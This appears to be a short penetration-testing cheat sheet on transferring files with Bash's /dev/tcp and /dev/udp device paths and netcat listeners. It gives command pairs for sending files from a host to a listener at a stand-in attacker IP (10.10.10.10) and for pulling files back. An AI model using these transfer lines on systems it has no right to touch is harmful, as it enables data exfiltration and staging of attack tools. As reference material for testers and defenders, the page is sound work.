# ⭕ TCP / UDP

## <mark style="color:red;">/dev/tcp & /dev/udp</mark>

#### Below two virtual device map provided by Linux: _/dev/tcp/$host/$port_ _/dev/udp/$host/$port_

{% hint style="warning" %}
`/dev/tcp` and `/dev/udp` redirections will work in BASH only if it has been compiled with `--enable-net-redirections` option. other shells such as zsh and rbash might not be able to redirect to tcp/udp device maps.
{% endhint %}

## <mark style="color:red;">TCP</mark>

### <mark style="color:orange;">Download File</mark>

```
nc -lvnp 80 > file # server
cat /path/file > /dev/tcp/10.10.10.10/80 # client
```

### <mark style="color:orange;">Upload Files</mark>

```
nc -w5 -lvnp 80 < file_to_send.txt # server

# client
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

## <mark style="color:red;">UDP</mark>

### <mark style="color:orange;">Download File</mark>

```
nc -ulvnp 80 > file # server
cat /path/file > /dev/udp/10.10.10.10/80 # client
```

### <mark style="color:orange;">Upload Files</mark>

```
nc -w5 -ulvnp 80 < file_to_send.txt # server


# client
exec 6< /dev/udp/10.10.10.10/4444
cat <&6 > file.txt
```
